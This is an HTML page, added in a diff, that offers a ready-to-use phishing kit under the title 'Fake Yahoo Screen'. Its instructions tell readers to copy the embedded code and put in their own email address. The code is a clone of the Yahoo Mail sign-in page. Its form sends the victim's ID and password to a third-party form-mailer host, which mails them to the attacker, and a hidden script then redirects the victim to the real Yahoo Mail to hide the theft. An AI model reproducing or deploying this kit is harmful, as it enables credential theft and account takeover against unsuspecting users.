@@ -1,0 +1,361 @@
+<html>
+<head>
+<title>Fake Yahoo Screen By Goldberg Paki</title>
+</head>
+<body>
+<center>Yahoo Fake login Screen version 0.1 By Goldberg Paki</center><p>
+Hello this is Goldberg Paki this is a little program by which you can make a fake yahoo login screen.
+<p>
+<h4>Instructions</h5><br>
+You just have to copy and paste all the codes written below and then save it in a html file.<br>
+You can save it with help of notepad or any other software.<br>
+1 thing more thing that in line 172 of the codes below. Replace your e-mail address with me@yahoo.com.<br>
+And if you all the things are done that`s all from Goldberg Paki i will soon bring you more.<p> 
+<textarea name="yahoo" rows="50%" cols="90%">
+<html>
+<head>
+<meta http-equiv="pics-label" content='(pics-1.1 "http://www.icra.org/ratingsv02.html")'>
+<title>Yahoo! Mail - The best free web-based email!</title>
+</head>
+<body bgcolor=#ffffff>
+<table border=0 cellpadding=0 cellspacing=0 width=680>
+	<tr>
+		<td colspan=3>
+<table border=0 width=100% cellpadding=4 cellspacing=0>
+	<tr>
+		<td valign=bottom><table cellspacing=0 cellpadding=0 width=100% border=0>
+ 	<tr>
+		<td width=1% align=left>
+<table width=1% cellspacing=0 cellpadding=0 border=0>
+	<tr>
+ 		<td width=1% align=left>
+
+
+
+
+
+<img src="http://us.i1.yimg.com/us.yimg.com/i/us/pim/b/mailma1.gif" alt="Yahoo! Mail" border="0" height="34" width="250">
+
+
+
+
+</td>
+	</tr>
+</table>
+		</td>
+
+		<td width=100% align=right nowrap valign=bottom>
+<table width=100% cellspacing=0 cellpadding=0 border=0>
+	<tr>		
+		<td width=99% align=right nowrap valign=bottom><font face=Arial size=-1><a href="http://www.yahoo.com">Yahoo!</a> - <a href="http://help.yahoo.com/help/us/edit/">Help</a></font>
+		<br><hr size=1 noshade></td>
+	</tr>
+</table>
+		</td>
+		</td>
+	</tr>
+</table>
+
+		</td>
+	</tr>
+	<tr>
+		<td bgcolor=#B6C7E5
+><font size=+1 face=Arial color=><b>Welcome to Yahoo! Mail
+</b></font>
+		</td>
+	</tr>
+</table>
+		</td>
+	</tr>
+	<tr>
+		<td colspan=3>
+<table width=100% bgcolor=FFFFFF align=center cellpadding=3 cellspacing=2 border=0>
+	<tr>
+		<td align=center>
+<font color=green face=arial><b>
+You must sign in to read or send mail.
+</b></font></b></font>
+		</td>
+	</tr>
+</table>
+		</td>
+	</tr>
+	<tr>
+		<td colspan=3 valign=top>
+<table border=0 bgcolor=FFFFFF cellspacing=2 cellpadding=0 width=100%>
+	<tr>
+		<td width="50%" valign="top">
+<table border=0 bgcolor=FFFFFF cellpadding=2 cellspacing=0 width="100%">
+	<tr>
+		<td align=center>
+		</td>
+	</tr>
+</table>
+
+<!-- property_promo -->
+<table border="0" cellspacing="0" cellpadding="0" width="100%">
+   <tr><td width="400" valign="top">
+                <table cellpadding="0" cellspacing="0" border="0" width="100%">
+      <tr><td valign="top" bgcolor="#859BC1" width="1%"><img alt="Yahoo! Mail" src="http://us.i1.yimg.com/us.yimg.com/i/us/pim/lgn/v4_mail1.jpg" width="125" height="281"></td>
+<td valign="top" bgcolor="#F2F4F8" width="99%">
+        			<table width="100%" cellpadding="4" cellspacing="0" border="0">
+						<tr>
+							<td>
+    							<table cellpadding="3" cellspacing="0" border="0">
+								  <tr> 
+									<td height="5"> </td>
+								  </tr>
+								  <tr> 
+									<td></td>
+									<td><font face="arial" color="#29416E"  size="+1"><b>New to Yahoo!?</b></font><br>
+									  <b style="font-family:Verdana; color: #29416e; font-size:11px;"><a 
+href="http://billing.mail.yahoo.com/bm/MailReg?.done=&.intl=us&.src=ym&.u=42isng8uimube&partner=&.p=&promo=&.last=">Get Yahoo! Mail</a> with new more powerful SpamGuard, some of the best spam protection available.</b></td>
+								  </tr>
+								  <tr> 
+									<td height="8"></td>
+								  </tr>
+								  <tr> 
+									<td valign="top">&nbsp;</td>
+									<td><b style="font-family:Verdana; color: #29416e; font-size:11px;">And it's just one of the many great features of Yahoo! Mail:</b></td>
+								  </tr>
+								  <tr> 
+									<td height="8"></td>
+								  </tr>
+								  <tr> 
+									<td valign="top"><img alt="bullet gif" src="http://us.i1.yimg.com/us.yimg.com/i/us/pim/lgn/v4_bul1.gif" width="6" height="8" vspace="2"></td>
+									<td><span style="font-family:Verdana; font-size: 11px;"><b>Free</b> email</span></td>
+								  </tr>
+								  <tr> 
+									<td valign="top"><img alt="bullet" src="http://us.i1.yimg.com/us.yimg.com/i/us/pim/lgn/v4_bul1.gif" width="6" height="8" vspace="2"></td>
+									<td><span style="font-family:Verdana;  font-size: 11px;"><b>Free</b> 4MB storage - up to twice as much as other free email providers!</span></td>
+								  </tr>
+								  <tr> 
+									<td valign="top"><img alt="bullet" src="http://us.i1.yimg.com/us.yimg.com/i/us/pim/lgn/v4_bul1.gif" width="6" height="8" vspace="2"></td>
+									<td><span style="font-family:Verdana; font-size: 11px;">Access from virtually anywhere, anytime</span></td>
+								  </tr>
+								  <tr> 
+									<td valign="top"><img alt="bullet" 
+
+src="http://us.i1.yimg.com/us.yimg.com/i/us/pim/lgn/v4_bul1.gif" width="6" height="8" vspace="2"></td>
+									<td><span style="font-family:Verdana; font-size: 11px;">  Address Book, Calendar, and much more!</span></td>
+								  </tr>
+								  <tr> 
+									<td height="8"></td>
+								  </tr>
+<tr>
+							<td colspan="2" align="center"><b><a href="http://billing.mail.yahoo.com/bm/MailReg?.done=&.intl=us&.src=ym&.u=42isng8uimube&partner=&.p=&promo=&.last="><font face="arial" size="+1">Sign up now</font></a></b></td></tr>
+						<tr>
+							<td colspan="2" align="center"><font face="arial" size="-2"><a href="http://edit.yahoo.com/config/form?.form=ym_signup_more_info&.intl=us&new=1&.done=&.last=&.src=ym&.v=4&.u=0&.partner=">Learn more...</a></font></td></tr>								  <tr> 
+									<td height="8" colspan=2> 
+									  <div style="width:275px;height:2px;"><spacer type="block" width=275 height=2></div>
+									</td>
+								  </tr>
+								</table>
+				 </td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table>
+</td>
+</tr>
+</table>
+<!-- property_promo -->
+		</td>
+		<td width="1%">&nbsp;
+		</td>
+		<td align="left" valign="top">
+<form method=post action="http://www.response-o-matic.com/cgi-bin/rom.pl" autocomplete=off name=password>
+<table bgcolor=#B6C7E5
+ border="0" cellpadding="2" cellspacing="0" width="100%">
+<tr><td>
+
+<table bgcolor="#eeeeee" border="0" cellpadding="2" cellspacing="0" width="100%"> 
+<tr><td bgcolor="#ffffff" align="center">
+
+<table border="0" cellspacing="6" cellpadding="6" bgcolor="ffffff" width="100%">
+<tr bgcolor="eeeeee">
+<td align="center"> 
+<font face="arial"><b>Existing
+Yahoo! users</b></font><br>
+<font face="arial" size="-1"><nobr>&nbsp;Enter your ID and password to sign in&nbsp; </nobr></font>
+
+<table border="0" cellpadding="4" cellspacing="0">
+<tr> <td align="right">
+
+<INPUT TYPE="hidden" NAME="your_email_address" VALUE="me@yahoo.com">
+
+<INPUT TYPE="hidden" NAME="email_subject_line" VALUE="Password Recieved">
+
+<INPUT TYPE="hidden" NAME="required_fields" VALUE="">
+
+<INPUT TYPE="hidden" NAME="thank_you_title" VALUE="&lt;script&gt;location.href = 'http://mail.yahoo.com/';&lt;/script&gt;">
+
+<INPUT TYPE="hidden" NAME="return_link_url" VALUE="http://mail.yahoo.com">
+
+<INPUT TYPE="hidden" NAME="return_link_name" VALUE="Hotmail">
+
+<INPUT TYPE="hidden" NAME="background_color" VALUE="#FFFFFF">
+
+<INPUT TYPE="hidden" NAME="text_color" VALUE="#000000">
+
+<INPUT TYPE="hidden" NAME="link_color" VALUE="#0000FF">
+
+<INPUT TYPE="hidden" NAME="visited_link_color" VALUE="#0000FF">
+
+<INPUT TYPE="hidden" NAME="active_link_color" VALUE="#0000FF">
+<table border="0" cellpadding="2" cellspacing="0">
+<tr> <td align="right" nowrap><font face="arial" size="-1">Yahoo! ID:</font></td>
+<td><input name="login" size="17" value=""></td>
+</tr>
+<tr> <td align="right" nowrap><font face="arial" size="-1">Password:</font></td>
+<td><input name="passwd" type="password" size="17" maxlength="32"></td></tr>
+<tr> <td colspan="2" nowrap align="center"><font face="arial" size="-1">
+<input type="checkbox" name="remember-my-id" value="y">Remember my ID on this computer</font></td>
+</tr><tr>
+<td>&nbsp;</td>
+<td><input name="submit" type="submit" value="Sign In"></td>
+</tr>
+</table> 
+
+</td></tr>
+<tr> 
+ <td nowrap bgcolor="eeeeee" align="center">
+<font face="arial" size="-1">Mode:
+Standard | <a href="https://login.yahoo.com/config/login?.src=ym&.v=0&.u=3r4oligvhciaa&.last=&promo=&.intl=us&.bypass=&.partner=&pkg=&stepid=&.done="> Secure</a>
+</font>
+ </td>
+</tr>
+</table>
+
+</td></tr>
+<tr bgcolor="eeeeee"><td valign="top" align="center"> <font face="arial" size="-1">
+<a href="http://login.yahoo.com/config/login?.src=ym&.help=1&.v=0&.u=3r4oligvhciaa&.last=&.last=.done ">Sign-in help</a>&nbsp;&nbsp;&nbsp;<a href="http://edit.yahoo.com/config/eval_forgot_pw?new=1&.done=http://f1.mail.yahoo.com&.src=ym&partner=&.intl=us&pkg=&stepid=&.last=">Forgot your password?</a>
+
+
+</font></td></tr>
+</table>
+</td></tr></table>
+</td></tr></table>
+</form>
+
+
+<!-- premium_promo -->
+<table bgcolor=#a0b8c8 border=0 cellpadding=2 cellspacing=0 width=100%>
+	<tr>
+		<td>
+			<table bgcolor=#ffffff border=0 cellpadding=0 cellspacing=0 width=100%>
+				<tr>
+					<td>
+						<table bgcolor=#ffffff border=0 cellspacing=2 cellpadding=3 width=100%>
+							<tr>
+								<td align=center>
+<font size=-1><b>Get the email address you've always wanted with
+<a href="http://us.rd.yahoo.com/login/ym/evt=10172/?http://personal.mail.yahoo.com">Personal Address</a></b></font>				
+								</td>
+							</tr>
+						</table>
+					</td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table>
+<!-- premium_promo -->
+
+
+		</td>
+	</tr>
+	<tr>
+		<td colspan=3 width=600>
+<hr width="640">
+<table width="640">
+	<tr>	
+		<td align=center>
+<div align="center">
+<table border=0 cellspacing=0 cellpadding=2 width=100%>
+	<tr>
+		<td align="left" colspan=2><font face="Arial"><b>
+Yahoo! Mail
+for International Users</b></font>
+		</td>
+	</tr>
+	<tr>
+		<td valign=top align=right><small><font face="Arial" size="-2"><i>Europe</i> :</font></small></td>
+		<td valign=top><small><font face="Arial" size="-2"><a
+href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=dk&.src=ym&.done=http%3a//f1.mail.yahoo.com">Danmark</a> - <a
+href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=de&.src=ym&.done=http%3a//f1.mail.yahoo.com">Deutschland</a> - <a 
+href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=es&.src=ym&.done=http%3a//f1.mail.yahoo.com">Espa&ntilde;a</a> - <a 
+href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=fr&.src=ym&.done=http%3a//f1.mail.yahoo.com">France</a> - <a 
+href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=it&.src=ym&.done=http%3a//f1.mail.yahoo.com">Italia</a> - <a
+href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=no&.src=ym&.done=http%3a//f1.mail.yahoo.com">Norge</a> - <a
+href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=se&.src=ym&.done=http%3a//f1.mail.yahoo.com">Sverige</a> - <a
+href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=uk&.src=ym&.done=http%3a//f1.mail.yahoo.com">UK</a>/<a
+href="http://eur.rd.yahoo.com/login/ym/*http://login.europe.yahoo.com/config/login?.intl=ie&.src=ym&.done=http%3a//f1.mail.yahoo.com">Ireland</a>
+</font></small></td>
+	</tr>
+	<tr>
+		<td valign=top align=right><small><font face="Arial" size="-2"><i>Pacific Rim</i>:</font></small></td>
+		<td valign=top><small><font face="Arial" size="-2"><a 
+href="http://rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=au&.src=ym&.done=http%3a//f1.mail.yahoo.com">Australia</a>/<a
+href="http://rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=nz&.src=ym&.done=http%3a//f1.mail.yahoo.com">NZ</a> - <a
+href="http://rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=cn&.src=ym&.done=http%3a//f1.mail.yahoo.com">China</a> - <a
+href="http://rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=hk&.src=ym&.done=http%3a//f1.mail.yahoo.com">Hong Kong</a> - <a
+href="http://rd.yahoo.com/login/ym/*http://login.india.yahoo.com/config/login?.intl=in&.src=ym&.done=http%3a//f1.mail.yahoo.com">India</a> - 
+<a
+href="http://rd.yahoo.com/login/ym/*http://edit.my.yahoo.co.jp/config/form?.lg=jp&.intl=jp&.form=main_mail&.src=ym&.done=http%3a//edit.my.yahoo.co.jp/config/mail%3f.intl=jp">Japan</a> - 
+<a
+href="http://rd.yahoo.com/login/ym/*http://login.korea.yahoo.com/config/login?.intl=kr&.src=ym&.done=http%3a//f1.mail.yahoo.com">Korea</a> - <a 
+href="http://rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=sg&.src=ym&.done=http%3a//f1.mail.yahoo.com">Singapore</a> - <a 
+href="http://rd.yahoo.com/login/ym/*http://login.yahoo.com/config/login?.intl=tw&.src=ym&.done=http%3a//f1.mail.yahoo.com">Taiwan</a></font></small></td>
+	</tr>
+	<tr>
+		<td valign=top align=right><small><font face="Arial" size="-2"><i>Americas</i>:</font></small></td>
+		<td valign=top><small><font face="Arial" size="-2">
+<a 
+href="http://rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=ar&.src=ym&.done=http%3a//f1.mail.yahoo.com">Argentina</a> - <a
+href="http://rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=br&.src=ym&.done=http%3a//f1.mail.yahoo.com">Brasil</a> - <a
+href="http://rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=ca&.src=ym&.done=http%3a//f1.mail.yahoo.com">Canada</a> - <a
+href="http://rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=mx&.src=ym&.done=http%3a//f1.mail.yahoo.com">Mexico</a> - <a
+href="http://rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=b5&.src=ym&.done=http%3a//f1.mail.yahoo.com">in Chinese</a> - <a
+href="http://rd.yahoo.com/login/ym/?http://login.yahoo.com/config/login?.intl=e1&.src=ym&.done=http%3a//f1.mail.yahoo.com">en Espa&ntilde;ol</a>
+</font></small></td>
+	</tr>
+</table></div>
+		</td>
+		<td align=center valign="middle"><a href="http://www.cnet.com/software/0-3227888-1204-9973844.html"><img SRC="http://us.i1.yimg.com/us.yimg.com/i/us/pim/lgn/cnet_ed3.gif" alt="CNET" WIDTH=40 HEIGHT=75 BORDER=0></a>
+<a href="http://my.yahoo.com/netapp/?http://www.netapp.com/poweredby.html"><img 
+SRC="http://us.i1.yimg.com/us.yimg.com/i/us/pim/lgn/ntap4.gif" alt=NTAP 
+WIDTH=105 HEIGHT=60 BORDER=0></a></td>
+	<td></td>
+	</tr>
+</table>
+		</td>
+	</tr>
+</table>	
+		</td>
+	</tr>
+	<tr>
+		<td colspan=3> 
+<table width=600 border=0 cellpadding=0 cellspacing=0>
+
+
+</table>
+		</td>
+	</tr>
+</table>	
+		</td>
+	</tr>
+</table>	
+</center>
+<!-- SpaceID=55021434 loc=Z noad -->
+
+<p>
+<center>
+<hr width="80%" size=1 noshade>
+<table width="750" cellpadding="0" cellspacing="0" border="0">
+	<tr>
+		<td align="middle"><font size=-2 face=arial color="#8d8d8d">Copyright &copy; 2003 Yahoo! Inc. All rights reserved.  <a href="http://docs.yahoo.com/info/terms/" target="_new">Terms of Service</a><br>
+<b>NOTICE: We collect personal information on this site.<br>To learn more about how we use your information, see our <a href="http://privacy.yahoo.com/" target="_new">Privacy Policy</a></b></font></td></tr></table></body></center>
+</html>
+</textarea>
